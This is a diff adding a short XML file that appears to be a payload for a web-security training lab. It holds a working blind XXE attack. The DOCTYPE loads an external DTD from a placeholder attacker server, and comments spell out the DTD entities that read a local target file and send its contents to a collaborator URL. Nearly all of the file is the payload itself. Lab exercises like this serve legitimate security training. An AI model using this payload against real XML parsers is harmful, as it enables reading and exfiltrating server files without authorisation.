@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- Blind XXE - Data Exfiltration via External DTD -->
+<!-- Use: Exfiltrate file content through OOB channel -->
+<!-- Target Lab: Blind XXE to exfiltrate data via external DTD -->
+<!-- Requires: Host evil.dtd on your server with content: -->
+<!-- <!ENTITY % file SYSTEM "file:///TARGET_FILE"> -->
+<!-- <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLABORATOR_URL/?x=%file;'>"> -->
+<!-- %eval; -->
+<!-- %exfil; -->
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://ATTACKER_SERVER/evil.dtd">
+  %xxe;
+]>
+<stockCheck>
+  <productId>1</productId>
+  <storeId>1</storeId>
+</stockCheck>
